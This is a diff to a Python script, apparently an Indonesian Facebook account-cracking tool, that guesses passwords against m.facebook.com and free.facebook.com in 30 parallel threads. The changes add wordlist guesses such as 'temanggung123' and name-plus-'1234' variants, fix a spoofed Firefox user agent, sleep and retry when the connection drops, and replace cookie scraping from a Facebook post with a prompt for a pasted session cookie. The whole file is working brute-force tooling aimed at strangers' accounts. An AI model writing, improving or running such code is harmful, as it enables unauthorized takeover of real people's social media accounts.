@@ -1,8 +1,7 @@
 import requests, re, os, random, sys, time, datetime
 from concurrent.futures import ThreadPoolExecutor as YayanGanteng
-from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
+from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
 
-from bs4 import BeautifulSoup as par
 from rich import print as prints
 from datetime import datetime
 from rich.tree import Tree
@@ -26,20 +25,7 @@ current = datetime.now()
 ha = current.day
 op = bulan[nTemp]
 ta = current.year
-"""
-for jiah in range(1000):
-	aa='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['5','7','9','11'])
-	c='AppleWebKit/537.36 (KHTML, like Gecko) Version/2.0'
-	d='Chrome/'
-	e=random.randrange(1,106)
-	f='0'
-	g=random.randrange(149,5195)
-	h=random.randrange(1,164)
-	i='Mobile Safari/537.36'
-	uaku2=f'{aa} {b}) {c} {d}{e}.{f}.{g}.{h} {i}'
-	ugen.append(uaku2)
-"""
+
 class Brute:
 
     def __init__(self):
@@ -51,16 +37,10 @@ class Brute:
     def ua_set(self):
         for xd in range(1000):
             xx=[]
-            aa='Mozilla/5.0 (Linux; Android'
-            b=random.choice(['5','7','9','11'])
-            c='AppleWebKit/537.36 (KHTML, like Gecko) Version/2.0'
-            d='Chrome/'
-            e=random.randrange(1,106)
-            f='0'
-            g=random.randrange(149,5195)
-            h=random.randrange(1,164)
-            i='Mobile Safari/537.36'
-            uaku=f'{aa} {b}) {c} {d}{e}.{f}.{g}.{h} {i}'
+            rr= random.randint
+            rc= random.choice
+            A = f'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0'
+            uaku=f'{A}'
             xx.append(uaku)
             self.ugen = random.choice(xx)
         return self.ugen
@@ -174,8 +154,8 @@ class Brute:
                     break
                 else:
                     continue
-            except Exception as e:
-                prints(e)
+            except requests.exceptions.ConnectionError:
+                time.sleep(31)
 
         self.loop += 1
 
@@ -255,7 +235,7 @@ class Brute:
                             PROSES CRACK DI MULAI
         --------------------------------------------------------""")
         global prog,des
-        prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
+        prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
         des = prog.add_task('',total=len(self.iid2))
         with prog:
             with YayanGanteng(max_workers=30) as bool:
@@ -268,39 +248,27 @@ class Brute:
                             pass
                         else:
                             pwv.append(nmf)
+                            pwv.append('temanggung')
+                            pwv.append('temanggung123')
                             pwv.append(frs+'1234')
-                            pwv.append(frs+'321')
                     else:
                         if len(frs)<3:
                             pwv.append(nmf)
                         else:
                             pwv.append(nmf)
+                            pwv.append('temanggung')
+                            pwv.append('temanggung123')
                             pwv.append(frs+'1234')
-                            pwv.append(frs+'321')
 #                        uas=self.ua_set()
 #                        print(f"""
 #ua asli  : Mozilla/5.0 (Linux; Android 5; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36
 #ua random: {uas}""")
-                        bool.submit(self.metode, idf, pwv, "m.facebook.com")
+                        bool.submit(self.metode, idf, pwv, "free.facebook.com")
 
         exit()
     def cookie(self):
         self.logo()
-        url = par(self.ses.get("https://www.facebook.com/100032386028880/posts/674525870303608/?app=fbl").text,"html.parser")
-        data = re.findall('"text":"(.*?)"',str(url))
-        cokxyz = []
-        cek = 0
-        for mmk in data:
-            if len(mmk)>=20:
-                try:
-                    if mmk in cokxyz:pass
-                    else:
-                        cek +=1
-                        cokxyz.append(mmk)
-                        print(f"[{cek}]. {mmk}\n")
-                except:continue
-        ahh = input("[?] nomor : ")
-        cookie = cokxyz[int(ahh)-1]
-        self.login_cokie(cookie)
+        ahh = input("[?] cookie : ")
+        self.login_cokie(ahh)
 
 Brute()
